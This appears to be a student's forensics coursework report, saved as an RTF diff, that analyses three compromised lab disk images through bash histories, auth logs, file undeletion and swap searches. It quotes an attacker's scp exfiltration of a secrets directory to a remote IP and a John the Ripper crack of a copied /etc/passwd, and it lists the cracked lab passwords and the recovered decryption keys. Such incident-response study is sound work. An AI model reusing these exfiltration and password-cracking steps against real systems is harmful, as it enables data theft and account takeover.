@@ -1,0 +1,387 @@
+{\rtf1\ansi\ansicpg1252\cocoartf1671
+{\fonttbl\f0\fmodern\fcharset0 Courier;\f1\fnil\fcharset0 Menlo-Regular;}
+{\colortbl;\red255\green255\blue255;\red0\green0\blue0;\red255\green255\blue255;}
+{\*\expandedcolortbl;;\cssrgb\c0\c0\c0;\cssrgb\c100000\c100000\c100000;}
+\margl1440\margr1440\vieww11780\viewh8400\viewkind0
+\pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx5040\tx5600\tx6160\tx6720\pardirnatural\partightenfactor0
+
+\f0\fs24 \cf2 \cb3 \CocoaLigature0 \
+ACT1 procedures:\
+==========================================================================\
+\
+ANALYSIS:\
+\
+.bash_history files examination in users' home directory:\
+\
+Bob:\
+sudo shutdown -h now\
+Bob just shut down the system.\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0
+\cf2 \CocoaLigature1 Eric:\CocoaLigature0 \
+\pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx5040\tx5600\tx6160\tx6720\pardirnatural\partightenfactor0
+\cf2 mutt\
+logout\
+\'85. (multiple times)\
+Eric just logged in and logged out of the Email. \
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+Kevin:(looks a bit complicated)\
+\
+mkdir music\
+logout\
+w\
+id\
+ls -al\
+cd music\
+ls\
+cd ..\
+crontab -l\
+echo "0 4 * * * rsync -aq --del --rsh="ssh" -e "ssh -l kevin" "kevin.dynip.com:My_Music/" "~/music"" | crontab -\
+crontab -l\
+ps x\
+ssh-keygen\
+cat .ssh/id_rsa.pub\
+logout\
+mkdir links\
+cd links\
+find ../music -exec ln -s \{\} \\;\
+ls\
+logout\
+cd links\
+ls -l\
+rm *.gif\
+ls -l\
+rm README\
+logout\
+\
+From Kevin's command history we can see that, he made the directory and logged out then checked the pre-scheduled tasks in the crontab file. The suspecious part is the scheduling part he added. e.g \
+\
+echo "0 4 * * * rsync -aq --del --rsh="ssh" -e "ssh -l kevin" "kevin.dynip.com:My_Music/" "~/music"" | crontab -\
+\
+This command basically says: 0 mins passes 4 am every day, every month, and every day of the week. Using the the delete(which deletes extraneous files at the destination directory) option, while remotely synchronizing (transmitting files)the local music directory with the remote kevin.dynip.com:My_Music directory. In a nutshell, he is scheduling this 'odd' job to executed from his computer every day at 4 a.m.\
+Besides this he just did some other regular activities, such as creating another directory "links" containing a list of symbolic links to the mp3 files in music directory, and removing his own files, etc. \
+\
+I think the reason the department became suspicious is this 4.a.m schedule, obviously this is an automated process, very likely done by Kevin himself, as we can see he is interacting with a website by his own name, and also communicating some music files, I do not detect anything suspicious or malicious. \
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+Peter\
+In his command history, he just cleared the screen when he needed to logout, there is nothing to be worried about.\
+\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+Takeda\
+Takeda has two things in his home directory. Eggdrop directory and a compressed file called: eggdrop1.6.19+ctcpfix.tar.gz, which prduces eggdrop1.6.19 when being decompressed.I looked into both directories and from the documentation I was able to read that eggdrop refers to an Internet Relay Chat bot, which is freely distributable under GNU General Public license. Then I used the open source repository to examined the directory.(https://github.com/eggheads/eggdrop.git). I could not find a significant modification from the original directory I downloaded, except from the fact that the original one contains even more directories. Moreover, from his command history the only possible way he can introduce internet traffic spike could be running of "irssi" command, however, from the documentation of the irssi, I can see that if we run in ones, it will only start this app but not automatically connect it to a server. Hence, Takeda only started the app but didnt connect it to anyone, hence, we conclude this action is not suspecious. Although, the eggdrop is configured and installed,it has never been actually run, this buys us the last step of verification that Takeda is not the culprit. \
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+Examination of the log files result:\
+After manually scanning through all the log files, I found many of them are empty, I used the grep to filter the cat log results so that the timestamp is 04:, however, could not find anything suspicius or interesting.\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97Final Report:\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\
+1.\expnd0\expndtw0\kerning0
+\CocoaLigature1 Whether you think the server was indeed compromised:\
+The server is not compromised. The only reason of that 'suspicious' traffic at 4.am is the auto-scheduled synchronization done by Kevin.\
+\pard\pardeftab720\partightenfactor0
+\cf2 2.Whether you think the attacker accessed any sensitive information\
+No attack was done to the server, hence, there is no data compromised.\
+3.Your recovery of any meaningful data\
+Since no data lost, there is really not a lot we can do. However, if we really wanna make sure no 4.am traffics go around, we should ban the students from using auto scheduled services if that doesnt effect the normal functionality of the company.\
+4.A discussion of what should be done before returning the system to production\
+For this case, the only thing should be done is to let the Kevin stop using that auto-synchronization program and should also quarantine the files being stored in the music directory (delete as necessary) and the traffic between website name stored in the README could be banned.\
+5.Recommendations as to how they can keep this from happening again\
+Come up with rules to regulate server usage for students such as setting time limits and maybe restriction on the purpose of the server usage.\
+6.An estimate on how long this assignment took you\
+I think I spent 5-6 hours for part 1, I think may be I spent a lot of time figuring out the setup part and commands. \
+\pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx5040\tx5600\tx6160\tx6720\pardirnatural\partightenfactor0
+\cf2 \kerning1\expnd0\expndtw0 \CocoaLigature0 \
+\
+\
+\
+\
+\
+\
+\
+\
+ACT2 Procedures:\
+==========================================================================\
+\
+\pard\pardeftab720\partightenfactor0
+\cf2 Analysis:\
+\pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx5040\tx5600\tx6160\tx6720\pardirnatural\partightenfactor0
+\cf2 .bash_history files examination in users' home directory:\
+(NOTE: for examination purposes, I first did su -s to gain privileged access to the directories and files.)\
+\
+Bill: \
+Doesn't have a .bash_history file\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+Fred: \
+simple checked the directory listings, then checked whoami, then tried to access the /secrets, /etc/group files. Then he created an txt file.\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+Guest:\
+Doesn't have a .bash_history file\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+Jake:\
+He actually did something interesting. From his command history we can tell that, he first recursively copied the entire /secrets directory to the current working directory, then he used scp to copy the copied secrets directory onto a host called:d000d@207.92.30.41, as we can see from this command: scp -r secrets d000d@207.92.30.41   :~/\
+Note: this remote host's ip address:207.92.30.41 coincides exactly with the provided kid's IP address at home.\
+After this , he moved the secret directory into a hidden directory called, .elinks. After this, I went into the root directory and looked into his .bash_history, I can see that:\
+adduser jake\
+cat /etc/group\
+vi /etc/group\
+This indicates jake could be added into a group which has access to the secret file. \
+Then I cd into the mysterious .elinks directory and was able to see there are two different subdirectories: numbers and others\
+In numbers, there are a lot of csv files containing secret numerical data, as indicated on the top of each of them. Then there is a NOTICE file, which says: THIS DATA MUST NOT FALL INTO THE WRONG HANDS\
+Indicating the importance and secrecy of this data. \
+In others directory, there are a lot of data files, which contain binaries, although I used the strings command to read them, but I could not interpret the actual meanings they contain, I believe these could be some hashed data of the original secret data. \
+From the /etc/group file, I can see that the Jake is in a group called secretive, but not in the root group.\
+Also by examining the access control of  the secrets directory and its subdirectories, we can see that they  only give access to group: systemd-journal and the directory owner: root. Others have no access.\
+However, Jake actually is a member of the root group, this explains why he was able to do the above actions.\
+(as found by: cat group | grep root\
+root:*:0:jake)\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+Jane:\
+From his bash history, we can see that, he also cd into the secrets directory, and then tried to read from the numbers subdirectory. Specifically, he tried to access:83.csv ,82.csv . Then he moved into the others file, then tried to copy the contents of secret2 and secret3 files into a new file. \
+From \
+cat secret3.data >> newsecret.data\
+ls -alh\
+cat secret3.data >> newsecret.data\
+I assume, he might not be able to do this successfully at his first attempt.\
+Then after some simple actions he logged out.\
+Also, after checking the /etc/group I can see that Jane is in the group secretive, but not in the root, so I imagine he cannot do much damage under his identity to the secrets.\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+John:\
+Doesn't have a .bash_history file\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+Mike:\
+In his directory, there is a lot of interesting things happened.\
+He first made a directory called foo. Then he became the root using su -. \
+He then copied the /etc/passwd file into a file called calendar.txt. Then he downloaded the John the Ripper john-1.7.2, using different tools, he tried wget then curl then lynx. This behavior is very suspecious because this illustrates the user's unfamiliarity with the actual environment allegedly belongs to him. This indicates this is an unauthorized access.\
+Moreover, he then reset the system, and checked the .bash_history afterwards, he seemed to learned the instructions of John the Ripper and eventually, he used it to crack the password he already copied from the /etc/passwd. This , unfortunately, is a strong indication of an attack.\
+\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+Examining the log files, I can see that many of the log files are empty such as lp-errs,uucplog,user.log, etc.\
+\
+Also, I cannot find anything suspicious from the system log files and other similar files.\
+However, I highly doubt the files such as auth.log, wtmp\
+When I used strings to read the wtmp file, I can see many login action history from it, which somehow shows an interesting log in sequence, e.g frequently logging into different accounts consecutively. This might indicate an attack. \
+Then I looked into the auth.log file, then I found many interesting things.\
+First, there is a mysterious IP address used by all the users, which is "193.252.122.103", but with different port numbers every time(Port numbers used: 33018,57719,57720,57722,57721,57726,34667,34672,55072,55075). \
+The logins were attempted as John, John, Fred, Fred, Mike, Mike, until this stage all the authentications had failed. However, at this point, Mike was authenticated via the same IP at port number 57720. \
+After logging out of this account. An authentication successfully made for user Fred , then for root. Then the user logged out, an authentication successfully made for user Jane. Then I observed logout and login for user Mike, and failures for su - attempts from Mike's account. Then Mike logged in and out again. Then Jane logged in then further became root then logged out. Eventually, the jake was created by Mike as su, also jake's password was changed and then a login from 127.0.0.1 port 1028, then a root session were successfully made.\
+\
+This sequence makes the story very clear. It seems like the attacker tried to login as different users. But he eventually managed to  get in as Mike, then he cracked the password file using John-the-Ripper, hence, he was able to log in as any other user whose informations is contained in the password file.Then the attacker tried to steal the secret under other users' identity, which was very likely unseccesful due to access control restrictions. Then the jake was created so that jake was in the root group to make file transferring possible(which transferred the secrets).\
+\
+For the part, how the attacker first get into the Mike's account, I believe this must be a result of password guessing because his password is 'password1' as John-the-Rippers cracks it, which is very guessable and vulnerable password. This concludes that Mike's account was compromised at the first place. \
+In this case, I believe the attacker is only interested in the secret files, which accounts for the server's confidentiality. Fortunately, there is not other damages such as halting the server's availability and its data integrity(although there are footsteps to modify the .bash_history file under Mike's account, adding the user jake, and creating the foo directory, etc). \
+Running the John:\
+root@workbench:/images/sda2/etc# john passwd  \
+Loaded 8 password hashes with 8 different salts (md5crypt [MD5 32/64 X2])\
+Press 'q' or Ctrl-C to abort, almost any other key for status\
+0g 0:00:00:04 71% 1/3 0g/s 10050p/s 10050c/s 10050C/s "hsnow".."snow"\
+0g 0:00:00:05 83% 1/3 0g/s 10073p/s 10073c/s 10073C/s js00000..jakekiddie00000\
+password1        (mike)\
+password         (guest)\
+tuesday2         (root)\
+\'85\'85\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97Final Report:\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\
+1.\expnd0\expndtw0\kerning0
+\CocoaLigature1 Whether you think the server was indeed compromised:\
+I think the server was indeed compromised. The  inspection conducted above strongly indicated an attack unless an insider was doing it on purpose to test the security of the server, but from the stories told it is unlikely, so I think the server is compromised.\
+\
+\pard\pardeftab720\partightenfactor0
+\cf2 2.Whether you think the attacker accessed any sensitive information\
+Unfortunately, the attacker did access secrets directory, which is set not to be accessed by any unauthorized person. \
+\
+3.Your recovery of any meaningful data\
+In order to recover from this attack, I think it is very important to change the secrets if possible, treating the old secrets as public; or if the secrets cannot be changed than there is really no other way to recover this confidentiality loss. Luckily, from my inspection there is no big integrity loss.\
+\
+4.A discussion of what should be done before returning the system to production\
+The server should be reset, just in case the attacker actually modified log files and disabled some functionalities to hide his other behaviors. I cannot exclude the possibilities of malware installations other critical data alternations which were not caught by the system monitors. After conducting a deep malware inspection or better resetting the system (including deleting created extra files), we should let all the users reset their passwords.\
+5.Recommendations as to how they can keep this from happening again\
+I think there should be additional layers of security mechanisms installed. They could use a VPN to restrict access to the internal access, only the legitimate employees registered can access to the internal resources via VPN(if they are not at work) or just via the internal access point if they are at work. Besides, the company can take some more strict access control policy such as limiting the number of failed login attempts. Moreover, employees should set strong passwords or should use multifactor authentication if necessary.\
+\
+6.An estimate on how long this assignment took you\
+I think I spent 4-5 hours for part 2.\kerning1\expnd0\expndtw0 \CocoaLigature0 \
+\pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx5040\tx5600\tx6160\tx6720\pardirnatural\partightenfactor0
+\cf2 \
+\
+ACT3 Procedures:\
+==========================================================================\
+ANALYSIS:\
+\
+.bash_history files examination in users' home directory:\
+chef\
+He didnt do anything suspicious but making a directory.\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+gardener\
+He seemed not to do anything suspicious but trying to encrypt the bash_history\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+jeeves\
+He looks the most suspicious because he signed in as rich at the beginning to view the bash_history of the rich and then signed in as su -. Also ran watch command.\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+rich\
+His .bash_history cannot be seen from the directory, likely fiddled by the attacker.\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+ubuntu\
+Doesnt seem suspicious rather looks like it is just a housekeeping directory.\
+Also from the auth.log file I cannot find any unauthorized sign in attempt, this indicates the attacker didnt use password guessing, or either guessed it right at the first time.\
+\
+\
+\'97\'97\'97\'97\'97\'97\'97Key Recovery:\
+\pard\pardeftab720\partightenfactor0
+\cf2 I examined the home directories and able to find the encrypted keys are located under /home/rich/swiss_keys.However, since the main goal is not to examine if an attack was launched I did not examine the .bash_history files like I did previously.\
+\
+\pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx5040\tx5600\tx6160\tx6720\pardirnatural\partightenfactor0
+\cf2 As the main goal of this task is to recover deleted files, I started undeleting the files using(instead of typical inspection of the bash history log files):\
+\pard\pardeftab720\partightenfactor0
+\cf2 \expnd0\expndtw0\kerning0
+\CocoaLigature1 sudo e2undel -d /dev/loop0 -s /images/recovered -a -t\
+This command recovers some deleted data and stores them into the predefined recovered file. While recovering I recovered the files under the name: 1001, since this is a user, and it has 5 files in it.\
+I only recovered files with inode numbers:\kerning1\expnd0\expndtw0 \CocoaLigature0  368000, 368001, 368002, 368003 because their size is similar to a key file in addition they are ASCII text files.\expnd0\expndtw0\kerning0
+\CocoaLigature1 \
+Then I went into the recovered file, from the story we can see "then they encrypted his swiss bank account access codes and held the decryption keys ransom for 1 megabucks.". This means we are only interested in finding those decryption keys, hence,I searched for keys in the recovered file. Then I cat all the recovered files, from first three of the inodes listed above I was able to retrieve:\
+\pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx5040\tx5600\tx6160\tx6720\pardirnatural\partightenfactor0
+\cf2 \kerning1\expnd0\expndtw0 \CocoaLigature0 7 17jonquil23scent14\
+8 26daisy99daisy99\
+6 13tulip34root28\
+The last file seems like a deleted bash history file which contains shredding actions conducted. \
+Then for the sake of correctness I used these keys to decrypt the swiss-key hashes, I guesses the numbers in front of them represent their key number and cd into the directory /home/rich/swiss_keys then run the gpg commands on the keys I doubt:\
+sudo gpg swisskey6.gpg\
+cat swisskey6.gpg\
+raindrops_keep_fallin_on_my_head\
+\
+sudo gpg swisskey7.gpg\
+cat swisskey7.gpg\
+twist_again_like-we_did_last_summer\
+\
+sudo gpg swisskey8.gpg\
+cat swisskey8.gpg\
+goodness_gracious_great_balls_of_fire\
+I conclude that my guesses were correct and the passwords I'm getting are meaningful.\
+\
+As an educated guess and following the hint by the TA, I conducted a simple search containing 'key' starting from the sda2 directory(which is my mounting point for loop1, which is associated with act3.img after the offset). I ran:\
+sudo touch mykeys.txt\
+sudo chmod 777 mykeys.txt\
+sudo find . -iname "*key*" >mykeys.txt\
+cat mykeys.txt\
+Then I was able to get a big list of relevant files, then I used the below command to filtered the results:\
+cat mykeys.txt | grep -v '\\.gpg' | grep -v '\\.gz'| grep -v '\\.pod'| grep -v '\\.ko'|grep -v '\\Turkey'\
+Then I was able to see two interesting keys:\
+./home/rich/.extrtmtc/key4\
+./tmp/extortomatic-23421/key1\
+\
+They caught my attention because of the way they were labeled, 4 and 1 might indicate their numbers. Then I cat them separately, I have:\
+cat ./tmp/extortomatic-23421/key1\
+1 23philo7dendron88\
+cat ./home/rich/.extrtmtc/key4\
+4 11hibiscus2hibiscus23\
+This time I am very confident that they are the keys I am looking for, then I got into the swiss-keys directory to test them:\
+\
+sudo gpg swisskey1.gpg\
+cat swisskey1\
+me_and_you_and_you_and_me-so_happy_2gether\
+\
+sudo gpg swisskey4.gpg\
+cat swisskey4\
+im_pickin_up_good_vibrations\
+\
+This is very rewarding it seems like I have obtained keys numbered:1,4,6,7,8.\
+Now we just need to search for the 2,3,5 keys. I was hoping to narrow the search but started by a big search:\
+sudo grep -rnwI sda2 -e^[0-9]\
+Interesting enough the last result of this search is:\
+sda2/home/rich/.mozilla/cache/a234Z8x0:1:5 19rose42blossom35\
+Then I again became confident that I found key. Then I went into the swiss-keys to test my result:\
+sudo gpg swisskey5.gpg (then pass in the password to the prompt)\
+cat swisskey5\
+its_the_little_old_lady_from_pasadena\
+Again this looks like a very legitimate key. \
+\
+Now I only have two more to look for e.g 2,3.\
+As hinted, now I examine the swap space.\
+I losetup the swap space onto loop1:\
+sudo losetup /dev/loop1 act3.img  -o 1497000960\
+sudo touch swap.txt\
+sudo chmod 777 swap.txt\
+sudo strings /dev/loop1 > swap.txt \
+Now I should be able to examine the swap.txt to find the keys.\
+Then I used the same trick(but due to the fact that all the previous keys ended with a number, I used the regex to narrowed my search):\
+cat swap.txt | grep "key" | grep -e[0-9]$\
+From the listed result I got another key:\
+key 3 29azalea8flower00\
+\
+Immediately go into the swiss-keys directory to verify:\
+sudo gpg swisskey3.gpg (then pass in the password to the prompt)\
+cat swisskey3\
+what_would_you_do_if_sang_out_of_tune\
+\
+Now, we have only one key to look for , key 2.\
+Then I went into the image directory where I created the swap.txt, then I did:\
+grep swap.txt -e^[2]\
+However, it didnt give me the desired key because the result is too big, I could not skim through.\
+Then I tried: cat swap.txt | grep "key" | grep -e[2]\
+Then I got the last key along with the results below:\
+key2 41jade6tree29p\
+key2 41jade6tree29~~~\
+%s -- (Sense key=0x%02x)\
+As before I went into the swiss-keys to test the result:\
+\
+sudo gpg swisskey2.gpg\
+When the password was prompted I put in the 41jade6tree29p password but it failed to decrypt, then I tried 41jade6tree29~~~ it also failed to decrypt the key. Then finally, when I tried it without the tailing p (to make it look like other keys,so that it will also end with and number instead of a character), e.g 41jade6tree29, it worked.\
+cat swisskey2.\
+everybody_dance_now_hey_now\
+\
+Now I believe I have retrieved all the lost 8 keys.\
+As a summary: \
+1) 23philo7dendron88\'97->me_and_you_and_you_and_me-so_happy_2gether\
+2) 41jade6tree29\'97->everybody_dance_now_hey_now\
+3) 29azalea8flower00\'97->what_would_you_do_if_sang_out_of_tune\
+4) 11hibiscus2hibiscus23\'97>im_pickin_up_good_vibrations\
+5) 19rose42blossom35\'97->its_the_little_old_lady_from_pasadena\
+6) 13tulip34root28\'97>raindrops_keep_fallin_on_my_head\
+7) 17jonquil23scent14\'97>twist_again_like-we_did_last_summer\
+8) 26daisy99daisy99\'97>goodness_gracious_great_balls_of_fire\
+\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97Final Report:\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx5040\tx5600\tx6160\tx6720\pardeftab720\pardirnatural\partightenfactor0
+\cf2 \
+\pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx5040\tx5600\tx6160\tx6720\pardirnatural\partightenfactor0
+\cf2 1.\expnd0\expndtw0\kerning0
+\CocoaLigature1 Whether you think the server was indeed compromised:\
+As stated by the 'rich man' the server is obviously compromised, and the data integrity and the security are both damaged, as important files are deleted and other actions took place.\
+\pard\pardeftab720\partightenfactor0
+\cf2 2.Whether you think the attacker accessed any sensitive information\
+I do think the attacker accessed very sensitive financial confidential data.\
+3.Your recovery of any meaningful data\
+I recovered the required very crucial decryption keys the person needed.\
+4.A discussion of what should be done before returning the system to production\
+Although the exact reason for this attack is not clear, it is very likely that the attacker managed to know the password belongs to the user javeer. I believe the system should be reset, and all the passwords should be changed immediately, also all the users should change their passwords and usernames if possible. They should treat all the information stored previously in the system as leaked. There could also be some undetected malware installed in the system, hence, a complete reset is necessary (Note: if there is some important information to be extracted , they should be obtained carefully without destroying them).\
+5.Recommendations as to how they can keep this from happening again\
+I recommend them to set strong passwords, which are hard to guess, also they should consider storing extremely important and sensitive data somewhere not directly connected to the internet. If they really have to they should consider using strong firewalls and multifactor authentication methods for that part of the system.\
+6.An estimate on how long this assignment took you\
+I spent around 6 hours on this part. \kerning1\expnd0\expndtw0 \CocoaLigature0 \
+\pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx5040\tx5600\tx6160\tx6720\pardirnatural\partightenfactor0
+\cf2 \
+\
+\
+umask 077\
+sudo touch passwords_cracked\
+sudo chmod 777 passwords_cracked\
+sudo john passwords_cracked\
+\pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx5040\tx5600\tx6160\tx6720\pardirnatural\partightenfactor0
+
+\f1\fs22 \cf2 Press 'q' or Ctrl-C to abort, almost any other key for status\
+butler           (jeeves)\
+moneymoney       (root)\
+plants           (gardener)\
+chef				(food)
+\f0\fs24 \
+moneybags		(rich)\
+This part I\
+\
+\
+\
+\
+\
+\
+\
+}
